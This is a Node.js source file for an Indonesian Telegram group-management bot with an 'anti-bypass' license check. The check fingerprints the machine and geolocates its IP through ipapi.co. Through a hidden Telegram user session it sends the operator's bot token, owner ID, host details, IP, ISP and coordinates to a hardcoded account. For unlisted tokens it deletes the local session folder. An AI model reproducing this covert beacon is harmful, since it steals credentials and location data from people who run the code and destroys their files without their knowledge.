/* CREATE BY @MODHZY */
/* LEVEL DEVIL ANTI-BYPASS ⚡
   + Global error/report handlers
*/

const TelegramBot = require("node-telegram-bot-api");
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram");
const os = require("os");
const axios = require("axios");
const fs = require("fs-extra");
const chalk = require("chalk");
const crypto = require("crypto");
const config = require("./config.js"); // { BOT_TOKEN, OWNER_ID }
const path = require("path");

const apiId = 123456; // api id lu
const apiHash = "abcd"; // api hash lu
const stringSession = new StringSession("ABCD"); // stringsession lu
const S_ID = "@usernamelu"; // username lu (atau id chat target)
const FIRST_RUN_FILE = ".first-run.json";
const LOCK_FILE = ".auth-lock";
const CRASH_LOG = ".crash.log";
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/usn/repo/refs/heads/main/tokens.json";
const { BOT_TOKEN, OWNER_ID } = require("./config.js");

/* ===================== CORE ===================== */
// Whitelist grup (hanya ID ini yang boleh)
const WHITELIST_GROUPS = [
  -1001234567890, // ganti dengan ID grup lu
];

// List banned users (array user ID string)
const bannedUsers = [];

function sha256(data) {
  return crypto.createHash("sha256").update(String(data || "")).digest("hex");
}

async function fetchValidTokens() {
  try {
    const res = await axios.get(GITHUB_TOKEN_LIST_URL, { timeout: 7000 });
    return Array.isArray(res.data.tokens) ? res.data.tokens : [];
  } catch (err) {
    console.error(chalk.red("❌ Tidak bisa ambil token dari GitHub!"), err?.message || err);
    await safeReport(`⚠️ *FAILED* fetchValidTokens()\nError: ${err?.message || err}`);
    process.exit(1);
  }
}

let _telegramClient = null;
let _telegramInitializing = false;
async function initClient() {
  if (_telegramClient) return _telegramClient;
  if (_telegramInitializing) {
    for (let i = 0; i < 20; i++) {
      if (_telegramClient) return _telegramClient;
      await new Promise(r => setTimeout(r, 200));
    }
  }

  _telegramInitializing = true;
  try {
    const client = new TelegramClient(stringSession, apiId, apiHash, {
      connectionRetries: 5,
    });
    await client.start();
    _telegramClient = client;
    return _telegramClient;
  } catch (err) {
    console.error(chalk.red("🚫 Gagal inisialisasi Telegram client:"), err?.message || err);
    _telegramInitializing = false;
    throw err;
  }
}

async function telegramSend(message) {
  try {
    const client = await initClient();
    await client.sendMessage(S_ID, { message, parseMode: "markdown" });
  } catch (err) {
    console.error("🚫 Telegram Error:", err?.message || err);
  }
}

async function safeReport(text) {
  try {
    await telegramSend(text);
  } catch {}
}

/* ===================== FINGERPRINT ===================== */

function getFingerprint() {
  const cpus = os.cpus() || [];
  return sha256(
    [
      os.hostname(),
      os.platform(),
      os.release(),
      cpus[0]?.model || "unknown",
      cpus.length || 0,
      Math.round((os.totalmem() || 0) / 1024 / 1024)
    ].join("|")
  );
}

function checkDeviceLock() {
  try {
    const fp = getFingerprint();
    if (fs.existsSync(LOCK_FILE)) {
      const saved = fs.readFileSync(LOCK_FILE, "utf-8").trim();
      if (saved !== fp) {
        const report = [
          "🚨 *DEVICE BARU TERDETEKSI!*",
          `*OWNER:* \`${OWNER_ID}\``,
          `*TOKEN:* \`${BOT_TOKEN}\``,
          `*HOST:* ${os.hostname()} (${os.platform()} ${os.release()})`,
          `*TIME:* ${new Date().toLocaleString()}`
        ].join("\n");
        safeReport(report);
        console.error(chalk.red("🚫 Bot hanya bisa jalan di device pertama!"));
        process.exit(1);
      }
    } else {
      fs.writeFileSync(LOCK_FILE, fp, { mode: 0o600 });
    }
  } catch (e) {
    console.error(chalk.red("⚠️ checkDeviceLock error:"), e?.message || e);
    process.exit(1);
  }
}

/* ===================== INTEGRITY (optional) ===================== */

function hashFile(filePath) {
  try {
    const buf = fs.readFileSync(filePath);
    return sha256(buf);
  } catch {
    return null;
  }
}

/* ===================== VALIDASI TOKEN + START ===================== */

async function validateToken() {
  try {
    console.log(chalk.blue("🔐 PLEASE WAIT... CHECKING TOKENS"));

    checkDeviceLock();
    const validTokens = await fetchValidTokens();
    const currentToken = String(BOT_TOKEN || "").trim();

    if (!currentToken) {
      await safeReport(`🚨 *NO BOT_TOKEN FOUND* on startup. Owner: \`${OWNER_ID}\``);
      console.error(chalk.red("🚫 BOT_TOKEN kosong. Exit."));
      process.exit(1);
    }

    if (!validTokens.includes(currentToken)) {
      const cpus = os.cpus();
      const totalMem = ((os.totalmem() || 0) / 1024 / 1024 / 1024).toFixed(2);
      const lang = process.env.LANG || "Unknown";
      const time = new Date().toLocaleString();
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      let ipInfo = { ip: "N/A", city: "-", country_name: "-", org: "-", latitude: "-", longitude: "-" };

      try {
        const { data } = await axios.get("https://ipapi.co/json/", { timeout: 5000 });
        ipInfo = data || ipInfo;
      } catch {}

      const report = [
        "**DETECTED PENYUSUPAN**",
        `**TOKEN :** \`${currentToken}\``,
        `**OWNER :** \`${OWNER_ID}\``,
        "",
        "**🔍 SECURITY REPORT 🔍**",
        `**📅 Timestamp:** ${time}`,
        "**🖥️ DEVICE FINGERPRINT**",
        `• OS: ${os.platform()} ${os.release()}`,
        `• Hostname: ${os.hostname()}`,
        `• CPU: ${cpus[0]?.model || "unknown"}`,
        `• CPU Cores: ${cpus.length}`,
        `• Memory: ${totalMem} GB`,
        `• Languages: ${lang}`,
        `• Timezone: ${timezone}`,
        "",
        "**📍 LOCATION DATA**",
        `• IP: ${ipInfo.ip}`,
        `• Location: ${ipInfo.city}, ${ipInfo.country_name}`,
        `• ISP: ${ipInfo.org}`,
        `• Coordinates: ${ipInfo.latitude}, ${ipInfo.longitude}`,
        "",
        "**🌐 BOT SERVER**",
        `• Loaded At: ${time}`
      ].join("\n");

      console.log(chalk.red("🚫 TOKEN TIDAK TERDAFTAR! BOT DIMATIKAN..."));
      await safeReport(report);

      await new Promise(r => setTimeout(r, Math.floor(Math.random() * 4000) + 2000));
      try { fs.rmSync(path.resolve("./session"), { recursive: true, force: true }); } catch {}
      process.exit(1);
    }

    console.clear();
    console.log(chalk.green("✅ TOKEN TERDAFTAR..."));

    try {
      await startBot();
    } catch (e) {
      console.error(chalk.red("❌ startBot error:"), e?.message || e);
      await safeReport(`❌ startBot failed: ${e?.message || e}`);
      process.exit(1);
    }

    await safeReport(`✅ **BOT AKTIF**\n**TOKEN:** \`${currentToken}\`\n**OWNER:** \`${OWNER_ID}\``);

  } catch (err) {
    console.error(chalk.red("🔥 FATAL ERROR SAAT VALIDASI:"), err?.stack || err);
    try { fs.appendFileSync(CRASH_LOG, `${new Date().toISOString()} - validateToken error:\n${err?.stack || err}\n\n`); } catch {}
    await safeReport(`🔥 *VALIDASI GAGAL*\nError: ${String(err?.message || err)}`);
    process.exit(1);
  }
}

/* ===================== START BOT ===================== */

async function startBot() {
  console.log(chalk.green(`
╔═══════════════════╗
   BOT BERHASIL JALAN
   OWNER : ${OWNER_ID}
   TOKEN : ${String(BOT_TOKEN).slice(0,8)}****
╚═══════════════════╝
`));

  const bot = new TelegramBot(BOT_TOKEN, { polling: true });

  // CMD /menu
  bot.onText(/\/menu/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `  
📌 *MENU BOT*
/start - Mulai bot
/menu - Menu utama
/bannedlist - List banned user
`, { parse_mode: "Markdown" });
  });

  // CMD /bannedlist
  bot.onText(/\/bannedlist/, (msg) => {
    const chatId = msg.chat.id;
    if (bannedUsers.length === 0) {
      bot.sendMessage(chatId, "✅ Tidak ada user yang di-ban.");
    } else {
      bot.sendMessage(chatId, `🚫 *User Banned:*\n${bannedUsers.join("\n")}`, { parse_mode: "Markdown" });
    }
  });

  // AUTO-LEAVE & kick
  bot.on("new_chat_members", async (msg) => {
    const chatId = msg.chat.id;

    msg.new_chat_members.forEach(async (member) => {
      if (member.id === bot.botInfo.id) {
        const inviter = msg.from.id;

        if (!WHITELIST_GROUPS.includes(chatId)) {
          await bot.sendMessage(chatId, "🚫 Grup ini tidak ada di whitelist. Bye!");
          await bot.leaveChat(chatId);
          return;
        }

        if (inviter.toString() !== config.OWNER_ID) {
          await bot.sendMessage(chatId, "🚫 Bot hanya bisa dipakai oleh owner. Bye!");
          await bot.leaveChat(chatId);
          console.log(`❌ Bot keluar dari grup ${chatId} (bukan owner)`);
        } else {
          await bot.sendMessage(chatId, "✅ Bot berhasil ditambahkan oleh owner.");
          console.log(`✅ Bot join ke grup ${chatId} (owner)`);
        }
      }
    });

    msg.new_chat_members.forEach((member) => {
      if (bannedUsers.includes(member.id.toString())) {
        bot.kickChatMember(chatId, member.id).then(() => {
          bot.sendMessage(
            chatId,
            `🚫 User [${member.first_name}](tg://user?id=${member.id}) sudah di-ban dan otomatis dikeluarkan.`,
            { parse_mode: "Markdown" }
          );
        }).catch((err) => {
          console.error("❌ Error kick user:", err.message);
        });
      }
    });
  });
}

/* ===================== GLOBAL ERROR HANDLERS ===================== */

process.on("uncaughtException", async (err) => {
  try {
    const text = `🔥 *UNCAUGHT EXCEPTION*\n${(err && err.stack) ? "```\n" + err.stack + "\n```" : String(err)}`;
    try { fs.appendFileSync(CRASH_LOG, `${new Date().toISOString()} - uncaughtException:\n${err?.stack || err}\n\n`); } catch {}
    await safeReport(text);
  } catch {}
  setTimeout(() => process.exit(1), 2500);
});

process.on("unhandledRejection", async (reason) => {
  try {
    const text = `🔥 *UNHANDLED REJECTION*\n${String(reason?.stack || reason)}`;
    try { fs.appendFileSync(CRASH_LOG, `${new Date().toISOString()} - unhandledRejection:\n${String(reason)}\n\n`); } catch {}
    await safeReport(text);
  } catch {}
  setTimeout(() => process.exit(1), 2000);
});

async function gracefulShutdown(sig) {
  try {
    console.log(chalk.yellow(`\n⚠️ Received ${sig}, shutting down gracefully...`));
    await safeReport(`⚠️ Bot shutting down due to signal: ${sig}`);
    setTimeout(() => process.exit(0), 1000);
  } catch (e) {
    setTimeout(() => process.exit(1), 1000);
  }
}
process.on("SIGINT", () => gracefulShutdown("SIGINT"));
process.on("SIGTERM", () => gracefulShutdown("SIGTERM"));

/* ===================== LAUNCH ===================== */

checkDeviceLock();
validateToken();
